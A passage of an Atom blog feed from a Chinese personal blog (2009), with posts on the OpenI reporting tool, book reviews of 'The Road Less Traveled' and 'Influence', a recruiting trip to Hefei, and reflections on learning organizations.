&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;当我们讨论报表工具的时候，根据数据量的不同大小，他们是基于不同的数据库系统或者结构。最常见到的数据库系统有&lt;a style=&quot;font-family: Verdana, arial, sans-serif; color: #2e6ab1; text-decoration: underline; padding: 0px; margin: 0px;&quot; title=&quot;MySQL&quot; href=&quot;http://en.wikipedia.org/wiki/MySQL&quot; target=&quot;_blank&quot;&gt;MySQL&lt;/a&gt;，&lt;a style=&quot;font-family: Verdana, arial, sans-serif; color: #2e6ab1; text-decoration: underline; padding: 0px; margin: 0px;&quot; title=&quot;Oracle&quot; href=&quot;http://en.wikipedia.org/wiki/Oracle_Database&quot; target=&quot;_blank&quot;&gt;Oracle&lt;/a&gt;，&lt;a style=&quot;font-family: Verdana, arial, sans-serif; color: #2e6ab1; text-decoration: underline; padding: 0px; margin: 0px;&quot; title=&quot;PostgreSQL&quot; href=&quot;http://en.wikipedia.org/wiki/PostgreSQL&quot; target=&quot;_blank&quot;&gt;PostGreSQL&lt;/a&gt;，&lt;a style=&quot;font-family: Verdana, arial, sans-serif; color: #2e6ab1; text-decoration: underline; padding: 0px; margin: 0px;&quot; title=&quot;SQL&quot; href=&quot;http://en.wikipedia.org/wiki/SQL&quot; target=&quot;_blank&quot;&gt;SQL&lt;/a&gt;等等。但是，报表并不是直接从数据库服务器制作而来的，在他们之间还需要一些中间层，以便让这些数据能够被处理成需要的形式。&lt;/p&gt;
&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;&lt;/p&gt;
&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;在OpenI中，这些中间层就是发布于&lt;a style=&quot;font-family: Verdana, arial, sans-serif; color: #2e6ab1; text-decoration: underline; padding: 0px; margin: 0px;&quot; title=&quot;J2EE&quot; href=&quot;http://en.wikipedia.org/wiki/Java_Platform,_Enterprise_Edition&quot;&gt;J2EE&lt;/a&gt;服务器上的&lt;a style=&quot;font-family: Verdana, arial, sans-serif; color: #2e6ab1; text-decoration: underline; padding: 0px; margin: 0px;&quot; title=&quot;OLAP&quot; href=&quot;http://en.wikipedia.org/wiki/Online_analytical_processing&quot;&gt;OLAP&lt;/a&gt;和&lt;a style=&quot;font-family: Verdana, arial, sans-serif; color: #2e6ab1; text-decoration: underline; padding: 0px; margin: 0px;&quot; title=&quot;RDBMS&quot; href=&quot;http://en.wikipedia.org/wiki/Relational_database_management_system&quot;&gt;RDBMS&lt;/a&gt;。技术上说，OpenI是某些基于Java的工具的整合，像&lt;a style=&quot;font-family: Verdana, arial, sans-serif; color: #2e6ab1; text-decoration: underline; padding: 0px; margin: 0px;&quot; title=&quot;Jpivot&quot; href=&quot;http://jpivot.sourceforge.net/&quot;&gt;JPivot&lt;/a&gt;，&lt;a style=&quot;font-family: Verdana, arial, sans-serif; color: #2e6ab1; text-decoration: underline; padding: 0px; margin: 0px;&quot; title=&quot;JFreeChart&quot; href=&quot;http://www.jfree.org/jfreechart/&quot;&gt;JFreeChart&lt;/a&gt;，&lt;a style=&quot;font-family: Verdana, arial, sans-serif; color: #2e6ab1; text-decoration: underline; padding: 0px; margin: 0px;&quot; title=&quot;Mondrian&quot; href=&quot;http://mondrian.pentaho.org/&quot;&gt;Mondrian&lt;/a&gt;和&lt;a style=&quot;font-family: Verdana, arial, sans-serif; color: #2e6ab1; text-decoration: underline; padding: 0px; margin: 0px;&quot; title=&quot;JasperReport&quot; href=&quot;http://jasperforge.org/plugins/project/project_home.php?group_id=102&quot;&gt;Jasper Report&lt;/a&gt;。&lt;/p&gt;
&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;&lt;/p&gt;
&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;它提供了一种简单的方式去将处理过的OLAP数据和最终用户联系起来，通过文字图形和图表的形式，用户只要简单的单击按钮，然后进行查询处理。使用它非常有趣，尤其当他是基于网络的。今后不久，各种信息处理器便会冲斥市场，这是必然的。&lt;/p&gt;
&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;&lt;/p&gt;
&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;由于市场上对于智能数据的需求，我十分确信的告诉诸位，这就是我们正在提及的&lt;a style=&quot;font-family: Verdana, arial, sans-serif; color: #2e6ab1; text-decoration: underline; padding: 0px; margin: 0px;&quot; title=&quot;Information 2.0&quot; href=&quot;http://analyticsbhups.blogspot.com/2008/11/information-20-and-openi.html&quot;&gt;信息2.0&lt;/a&gt;的时代。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>读《少有人走的路》</title>
   <link href="http://hackfisher.github.com/blog/2009/04/read-road-less-traveled"/>
   <updated>2009-04-06T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2009/04/read-road-less-traveled</id>
   <content type="html">在谈及这本书 之前，先说说一些个人经历。本人作为一个不修边幅的80后男生，平常对穿着打扮实在不太感冒，认为浪费时间。去年回家过年，我妈认为我头发太难看，逼着我去理发，而我这个从不烫发的老实小子怀着叛逆的心理第一次去理发店烫了个稍显古怪的发型。说实话，我自己也不喜欢这个发型，回南京有空就把它修理了。重要的不是发型，而是我所想要表达的，那种渴望独立的心情。正如不久前，即将毕业时，自己和父母在关于选择人生道路时的分歧一样，我所想要表达是每个人都应该选择他自己的独一无二的道路，这是一个心智成熟的旅程，而每个人的这条道路对于其他人来说都是“少有人走的”。
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #0000ee;&quot;&gt;&lt;img id=&quot;BLOGGER_PHOTO_ID_5321590232451303330&quot; style=&quot;display: block; margin-top: 0px; margin-right: auto; margin-bottom: 10px; margin-left: auto; text-align: center; cursor: pointer; width: 225px; height: 320px;&quot; src=&quot;http://2.bp.blogspot.com/_BU0qLYlS0SQ/SdoWHxVyx6I/AAAAAAAABCM/pdQvwl1FFBY/s320/%E5%B0%91%E6%9C%89%E4%BA%BA%E8%B5%B0%E7%9A%84%E8%B7%AF.jpg&quot; alt=&quot;&quot; border=&quot;0&quot; /&gt;&lt;/span&gt;
&lt;div&gt;
&lt;div&gt;&lt;a href=&quot;http://www.douban.com/subject/1775691/&quot;&gt;《少有人走的路》&lt;/a&gt;是一本畅销书，可是看到它时却不是在什么《纽约时报》的畅销书排行榜上，而是从好朋友的豆瓣上看到的，副标题是“心智成熟的旅程”。人可以拒绝任何东西，但绝不可以拒绝成熟。正如译者在序中所说：“如果说以前中国人最大的问题是温饱问题，那么，今天，中国人最大的问题就是心理问题，而心智不成熟又是心理问题中最大的问题”。这本书的作者，M.斯科特.派克，是一名杰出的心理医生，该书的观点和思想，大多来自于他的从业经历。我们长期以来的想法和感受，终有一天会被一些陌生人一语道破，而派克或许就是其中的一个。&lt;/div&gt;
&lt;div&gt;这本书的大多数内容在论述关于心理问题以及心智成熟的话题，自律，爱，成长和宗教，神奇的力量。然而，让我最感兴趣并且读起来津津有味的却是最后部分关于“神奇的力量”的论述。如果大家在高中或者大学学过物理的话，可能会知道所谓热力学第二定律，世界由有序向无序发展，能量从有规律的状态流向无规律的状态，从高度分化流向低度分化，宇宙处于逐渐分解状态，直至达到没有组织不再分化的状态，就像流水一样，永远只从高处往低处流动。根据热力学第二定律，经过十亿年时间，宇宙会完全分解，其高度降至最低点，成为没有任何形状和结构、不再发生分化的死寂状态，这种没有组织、不再发生分化的状态，我们称之为“熵”。而这种导致能量自然的从高处流向低处，最终进入熵的状态的作用，称为“熵的力量”。现在我们已经知道，生物进化过程与熵的力量彼此抵触，由此联想到，生物的死亡是不是也是一种“熵的力量”，与生物成长相抵触。进化过程是由低向高的发展，在此过程中，事物变得更复杂，更具分化性，更有组织性。&lt;/div&gt;
&lt;div&gt;关于进化过程，作者把它画成一座金子塔，如下：&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #0000ee;&quot;&gt;&lt;img id=&quot;BLOGGER_PHOTO_ID_5321573795464906210&quot; style=&quot;display: block; margin-top: 0px; margin-right: auto; margin-bottom: 10px; margin-left: auto; text-align: center; cursor: pointer; width: 320px; height: 229px;&quot; src=&quot;http://3.bp.blogspot.com/_BU0qLYlS0SQ/SdoHLAy2heI/AAAAAAAABBs/mUMtfQjLek4/s320/%E7%94%9F%E7%89%A9%E8%BF%9B%E5%8C%96.png&quot; alt=&quot;&quot; border=&quot;0&quot; /&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;类似的，作者提出了人类的心灵进化的金子塔图形。因此，作者指出，心灵的成长，心智的成熟，需要不断的努力，必然是艰苦的过程，因为在这一过程中，它必须和自然的力量——熵的力量对抗。如同生物进化一样，我们的心灵还是克服了熵的力量，并得以成长。心灵进化的金子塔图形，适用于每一个人。&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #0000ee;&quot;&gt;&lt;img id=&quot;BLOGGER_PHOTO_ID_5321573810182789746&quot; style=&quot;display: block; margin-top: 0px; margin-right: auto; margin-bottom: 10px; margin-left: auto; text-align: center; cursor: pointer; width: 320px; height: 256px;&quot; src=&quot;http://3.bp.blogspot.com/_BU0qLYlS0SQ/SdoHL3n3mnI/AAAAAAAABB0/8BcrDl3GFG4/s320/%E5%BF%83%E7%81%B5%E8%BF%9B%E5%8C%96.png&quot; alt=&quot;&quot; border=&quot;0&quot; /&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;那么阻碍心智成熟的障碍，即所谓心智成熟过程中“熵的力量”是什么呢?作者认为，最大的障碍就是懒惰。只要克服懒惰，其他阻力都能迎刃而解。不难理解，每个人都有保持现状的惰性，害怕去改变，因为改变会带来痛苦和未知的麻烦。正是这种惰性阻碍了各种通往高级层次状态的可能性道路，也许连第一步你都没有跨出去。&lt;/div&gt;
&lt;div&gt;对于这些话题，我只是拾人牙慧，如果您感兴趣，更多的内容在书中，慢慢去看吧。&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>读《影响力》</title>
   <link href="http://hackfisher.github.com/blog/2009/04/read-influence"/>
   <updated>2009-04-05T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2009/04/read-influence</id>
   <content type="html">&lt;div&gt;&lt;a href=&quot;http://www.douban.com/subject/1005576/&quot;&gt;《影响力》&lt;/a&gt;是一本销售心理学的书，按道理来说，它是写来给那些销售工作者看的，但事实上，这却不是作者的本意。书的作者写这本书时恰恰是用来告诉人们，甚至帮助人们，来应付那些怀有目的让他们轻易“说是”的“影响专家”。这本书阐述了各种有意无意的利用心理武器来捕猎的技巧，它的本意是用来教会人们怎么防止被捕猎，但同时也会教会人们去怎么捕猎别人。从某种意义上来说，每个人既是猎物又是猎人。因此，这本书对于每个人的教育都是意义深刻的，精彩之极。&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #0000ee;&quot;&gt;&lt;img id=&quot;BLOGGER_PHOTO_ID_5321589834695801682&quot; style=&quot;display: block; margin-top: 0px; margin-right: auto; margin-bottom: 10px; margin-left: auto; text-align: center; cursor: pointer; width: 224px; height: 320px;&quot; src=&quot;http://2.bp.blogspot.com/_BU0qLYlS0SQ/SdoVwnlfe1I/AAAAAAAABCE/PVxT_eYhhqE/s320/%E5%BD%B1%E5%93%8D%E5%8A%9B.jpg&quot; alt=&quot;&quot; border=&quot;0&quot; /&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;这本书在豆瓣上的评论是相当高的，事实上，我当初正是好奇这是怎样一本书，能够获得如此高的评价，有些评价甚至让人觉得很夸张。比如有一位评论说：“我只希望这本书没有被出版”，还有些读者看完后写书评，题目叫做“看完了不要借给别人看，包括朋友”。这些人的心理其实是很有趣的，我甚至怀疑大部分人都会或多或少的这种想法。正如我一样，他们意识到了人类社会有时就像丛林，而《影响力》就是这样一本书，能提高人们在丛林社会中的技能。丛林社会体现在相互竞争性和互斥性上，别人提高了，对自己就越不利。这样说，确实有些太夸张了，因为这种看法太过片面了，谁都知道，除了竞争，还有合作。&lt;/div&gt;
&lt;div&gt;但是，回到当前社会，尤其是中国，面对这么大的人口数量压力，我感觉人们的竞争意识大大强于合作意识，在我身边的几乎所有的同龄人，都是从高考过来的。在高考这种巨大的压力面前，提升的正是人们的竞争意识，对合作意识到培养是少之又少，而合作意识正是公司等社会团体十分重要的价值所在，我也仅仅是在工作后，才深刻的体会到合作的重要性。&lt;/div&gt;
&lt;div&gt;我们生活在一个自动化的时代，人们觉得自己更有力量，能主宰自然。但是很少有人意识到，他们作为大自然的一部分，仍然存在着一些原始或者现代的依从，带着某些机械性，有一些正如作者所描述的雌火鸡的行为一样不可理喻。一只雌火鸡会满腔热情地拥抱一个天敌，仅仅因为它发出了“嘁噗-嘁噗”的声音；她会毫不留情地虐待甚至杀死自己的后代，也仅仅因为它没有发出这种声音。我想要说的是，人们自己也好不到哪里去，一旦按下按钮，便会播放自己体内事先录好的基因磁带，卡塔-哗...&lt;/div&gt;
&lt;div&gt;我推荐此书的时候，总会在前面加上一句“很不情愿的”。我甚至怀疑书的作者写出这本书时，是不是也犹豫了一下。所以，即使是您或者我已经读过了这本书，我们仍然是人，不必期望能够通过读这本书来改变你的机械性和心理，因为你的心理反应在大多数情况下是合理的，只不过当心理学成为一种武器的时候被别人利用时，才会变得有些危险。所以，如果你不是用它来帮助你作为销售或者其他武器的话，不必太认真，这本书只不过是用来更好的帮助你认识自己和他人。&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>合肥行记</title>
   <link href="http://hackfisher.github.com/blog/2009/03/travel-hefei"/>
   <updated>2009-03-22T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2009/03/travel-hefei</id>
   <content type="html">&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;最近公司派同事和我到合肥中科大去了一趟，公司事务不便详谈，谈谈对合肥这个城市的印象吧。以前对合肥的了解很少，只知道是安徽的省会，还有就是中科大的所在，这正是我们此行的目的。我们整个行程，从离开南京火车站到回到南京火车站，整个行程28小时，看看这效率..&lt;/span&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;从南京到合肥坐动车正好一个小时左右，车上同事告诉我在合肥打的很便宜，起步价只有6元钱左右，不知道这与各个城市的消费水平有没有关系。初到合肥，天气不是很好，正值下班高峰，打的队伍排的长长的，要等很长时间。从没见过哪个城市打的这么难的，我们走了老远，到了一个什么希尔顿大饭店的门口，才打到的。安徽是个欠发达省，合肥从气质上来说也少有了大城市的那种自信。穿走于街头，感觉到的除了是混乱的交通，俗气的街头灯饰，疲惫的人群，再有没有其他什么了。我瞬间仿佛感觉，这个城市是属于小市民的..&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;车子开到大概是科大附近的一个饭店旁边，同事在科大的两个同学请他在这边聚聚，我就凑凑热闹。饭后，就沿着街边走了走，感觉街上真是够冷清的，沿着这条够冷清的街道走到了中科大东区的门口。对中科大的印象主要来源于高中老师和报纸的吹牛(×××少年班什么的)，还有就是大学时听说的科大跟南大差不多的气质(能静下心来搞学术)，不过科大比南大幸运多了，估计在合肥这块地盘上，科大会被当成个宝供着，科大更不可能有像南大可能被一条四车道劈成两半的尴尬境遇。我对科大还是崇敬有加的，因为大学时有一位很有趣的副教授就是科大少年班毕业的，哪怕从现在四十多岁的他身上看来，都能感觉到他当时在科大合肥这块地盘上他一定经历了许多年少轻狂的故事。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;第二天在科大，真是忙碌了一天。金融危机确实对中国的普通人造成的冲击，例一，科大包括其他大学的好多学生今年的出国形势不容乐观，要知道很多穷学生没有全奖是几乎无法承担的，他们中的部分人也参与到了找工作的行列，例二，同事他同学的一个朋友，也是做软件的，因为经济危机被开掉了，至于经济危机是不是一个借口不得而知。在加上考研落榜的学生们，这三股汇聚了今年找工作的庞大队伍。上午真的把我累死了，好长的队伍，不过还是得认真的接收看看简历，是真不想负了这些学生的心(有个简历的标题是“×××，捧着一颗心来”，心软的我让他进面试了)，毕竟我也曾是他们中的一员。这个时候，我才知道，合肥除了科大之外，还有两所还行的大学，安徽大学和合肥工业大学。这种经历真是有趣，我不到一年前还未跨出学校，现在却在这些学生面前接受着简历，这些学生大都毕恭毕敬，有的认真，有的麻木，有的套近乎，有的关切。我则是尽量缓和气氛，找些他们简历上有趣的事情聊一聊，比如许多电子与工程学院的学生都会在简历上加上这么一条——“科大生源最优秀的系之一”，我乐翻天了，每遇到这样一份简历，都会问下为什么这么写，还有好多学生是从其他学院转到这个专业的，看来当时此专业确实很火。还有另外一点，我可以很明显的看出来，那些学校较差的学生更加重视珍惜这些机会，非常认真的想多问几句。其中有个数学系的女生，成绩排名第一，我就请她讲解一下简历上提到的一篇论文的意思给我听，是关于矩阵排序的，讲的很不错，估计旁边的人正纳闷，这个hr怎么连数学都懂一点。当然了，有时候遇到美女了，也会多聊几句，能够缓解缓解疲劳嘛。最搞笑的是，结束后，有几个不知道哪来的学生，给我们送来两瓶矿泉水，想打听一下消息，希望多给他们机会，不知道这算不算“贿赂”...当然了，直到我们走后，那两瓶水还在静静的立在那桌子上面。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;下午面试，我心想大家都是年轻人，不必太严肃，我早上醒来时就想好了一个简单的面试题：&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;现有60个球，请任意选择放到6个盒子中去，要求如果想要选择任意数量的球时，只要选择若干盒子，这些盒子中就包含此数量个数的球.&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;我旁边一科大高分子的博士(同事的同学，过来旁听的)很快的就答出来了。面试过程中其他比较搞笑的情形，就是那些同学听到我同事说出我年龄时夸张的表情，他们估计很郁闷..&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;晚上吃饭时感叹，真是把广大科大同学涮了一把，其实最终我们要的人数肯定不会超过五个手指头(想起黑社会老大伸手指头的情形),不过我们来时也没想到会有这么多人啊，只不过是来赚经验的而已。还有，合肥餐馆的菜真是便宜啊。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;晚上有点郁闷，动车没票了，被黄牛拉过去，坐了一辆破车，颠啊颠的，两个多小时，才到南京。那黄牛也真够黑的，向一女生要了160，还好那美女机灵，上车趁不注意，向一乘客讯问了价格，才60，把她给气的。然后乘很多人在，给她壮胆，嚷嚷了才把价格拉到100。一路无事，晚上11点钟到家，洗洗倒头就睡...&lt;/span&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>谈谈学习型组织的实践</title>
   <link href="http://hackfisher.github.com/blog/2009/03/talk-about-the-practice-of-the-learning-organization"/>
   <updated>2009-03-07T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2009/03/talk-about-the-practice-of-the-learning-organization</id>
   <content type="html">&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;学习型组织（Learning Organization），美国学者彼得·圣吉（Peter M. Senge）在《第五项修炼》（The Fifth Discipline）一书中提出此管理观念，企业应建立学习型组织，其涵义为面临变遭剧烈的外在环境，组织应力求精简、扁平化、弹性因应、终生学习、不断自我组织再造，以维持竞争力。
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;img id=&quot;BLOGGER_PHOTO_ID_5310725495105326274&quot; style=&quot;display: block; margin: 0px auto 10px; text-align: center; cursor: hand; width: 320px; height: 215px;&quot; src=&quot;http://2.bp.blogspot.com/_BU0qLYlS0SQ/SbN8s0tdDMI/AAAAAAAABBc/UqL0h8ABCas/s320/%E5%AD%A6%E4%B9%A0%E5%9E%8B%E7%BB%84%E7%BB%87.jpg&quot; alt=&quot;&quot; border=&quot;0&quot; /&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;前段时间公司提到所谓学习型组织，是件好事，但许多事情做到的结果往往会与目标恰恰相反。所以说，有时候做事情的技巧和细节也非常重要。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;比如其中有一项是每天写邮件，总结今天干了什么，有什么想法，和明天的打算。这其实是一个非常好的想法，除了可以让leader了解到手下的人具体的做了什么，及时掌握公司日常运作情况，还可以增进员工之间的相互理解和沟通。但是非常好还不够？好的想法还必须付诸正确的实践手段才能起到有效的作用。这项措施其实很早就开始实施，并且刚刚开始大家都还是能够做到完成任务。但是渐渐的，一个严重的问题出现了，出现了形式化的倾向，把这项东西作为一个无关紧要的东西，应付了事。再其后，大家渐渐的就开始对这个东西有点厌烦，甚至感觉有点像是变相监督，慢慢的都不写了。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;过了一段时间，觉得不行，还得写，不写leader不踏实。但是意识到了大家支持反对不一，广泛征求意见，我指出了以前形式化错误，以及参与者的不良体验。于是重新开始，规定了上面的三项(今天，想法，明天)，至于内容可以比较自由化。这次有了以前的经验，真的比以前好多了。但是还是仍然存在一些问题，导致我对这种措施的实施效果的持久性仍不太乐观。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;可以从想法谈起。我平时属于比较活跃的人之一，想法也比较多，也比较乐于跟别人分享和沟通自己的想法，知道分享的价值所在。所以刚刚开始时，有了想法就说出来，而且顾忌比较少，对各个方面的事情都会谈谈，但是马上感觉到了一些不对劲。首先，回应的人寥寥，大家各说各的，无法形成有效的沟通。其次，有一个现象是公司里面管事的人位置比较高的人谈的比较多，但是做事的人进来比较晚的人谈的比较少，一般是寥寥带过。我属于后者，所以感觉不对劲，人们往往会根据现象来反推本质。于是对公司各个方面评头论足的就少了，而是渐渐主要谈谈自己工作的一些想法，一堆形式化的东西我写不来。于是每天，我开始谈论一堆关于编程方面经验感想啊什么的，不过这些东西公司里面也就那么几个人听的懂，所以我很怀疑这样的效果和意义，我对其他部门的细节不感兴趣，学习型组织有个要素就是——“&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 19px; font-family: '-webkit-sans-serif';&quot;&gt;&lt;a style=&quot;text-decoration: underline; margin: 0px;&quot; title=&quot;自我超越&quot; href=&quot;http://wiki.mbalib.com/wiki/%E8%87%AA%E6%88%91%E8%B6%85%E8%B6%8A&quot;&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #cc9933;&quot;&gt;自我超越&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;（&lt;/span&gt;&lt;/span&gt;&lt;a style=&quot;text-decoration: none; margin: 0px;&quot; title=&quot;Personal Mastery&quot; href=&quot;http://wiki.mbalib.com/wiki/Personal_Mastery&quot;&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;Personal Mastery&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;）：个人有意愿投入工作，专精工作技巧的专业等等。而且，在别人面前谈论一些他们不懂也不需要懂得东西让我觉得自己有点&quot;自大和白痴&quot;。所以结果我发现，那些愿意分享自己想法的人，不仅没有得到什么，而且失去了不少，没有任何的激励。这个制度本身的价值就是互相矛盾的，与学习型组织互相提高，互相激励共赢的精神是违背的，付出的多收获的却少。而违背自然规律法必定会自我消亡，很可惜的是，在今天的中国，仍然有不少公司或组织的领导人还在沿袭毛时代那种狂妄自大，人定胜天的落后理念。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;打个也许不恰当的比方。感觉每天这样说出自己的想法就像过去吃大锅饭一样(当然了，我没吃过，不过听父辈提起过)，大家一起吃，每个人都可以吃到，但是每个人都吃的少，每个人都吃不好，每个人提供粮食的积极性都不高(假设提供劳动力=提供粮食)；类似的，每个人大家的想法一起提，一起看，但是每个人看到的都很少，每个人接受到想法质量也不高，每个人提供想法的积极性不高。问题关键，不是积极性高不高的问题，而是这种大锅饭造成了这种格局。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
